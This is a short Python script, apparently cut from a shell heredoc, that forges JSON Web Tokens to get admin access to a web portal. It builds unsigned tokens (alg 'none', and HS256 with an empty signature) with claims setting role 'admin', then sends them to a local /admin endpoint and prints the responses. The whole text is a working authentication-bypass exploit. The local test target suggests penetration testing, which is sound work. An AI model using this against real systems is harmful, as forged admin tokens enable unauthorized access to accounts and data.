import base64,json,urllib.request,urllib.error
url='http://localhost:63987/admin'
claims={'sub':'3','username':'testuser','role':'admin','iat':1795336198,'exp':1795339798}
def b64(d):return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
for name,token in [('none',b64({'alg':'none','typ':'JWT'})+'.'+b64(claims)+'.'),('missing_signature',b64({'alg':'HS256','typ':'JWT'})+'.'+b64(claims)+'.')]:
 req=urllib.request.Request(url,headers={'Host':'portal.blogvault.test','Authorization':'Bearer '+token})
 try:r=urllib.request.urlopen(req)
 except urllib.error.HTTPError as e:r=e
 print(name,r.status,r.read().decode()[:500])
PY"

